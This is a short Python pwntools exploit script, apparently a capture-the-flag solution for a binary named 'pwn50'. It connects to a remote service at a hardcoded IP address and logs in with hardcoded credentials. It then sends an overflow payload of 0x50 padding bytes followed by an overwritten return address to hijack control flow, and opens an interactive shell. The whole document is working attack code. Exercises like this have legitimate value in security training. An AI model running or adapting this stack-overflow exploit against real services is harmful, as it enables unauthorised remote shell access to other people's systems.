#!/usr/bin/python
from pwn import *
sh = remote("47.104.16.75",9000)
#sh = process ("./pwn50")
target = 0x40084a
sh.recvuntil("username:")
sh.sendline("admin")
sh.recvuntil("password:")
sh.sendline("T6OBSh2i")
sh.recvuntil("Your choice:")
sh.sendline('1')
sh.recvuntil("Command:")
sh.sendline("/bin/sh")
sh.recvuntil("Your choice:")
raw_input("press enter to continue")
#can use ida/gdb to debug
payload = '3' * 0x50 + 2 * p64(target)
#rbp-50h)=>pad(0x50)
#ebp sizeof(int)=8=>0x8
#ret sizeof(int)=8=>8
sh.sendline(payload)
sh.interactive()
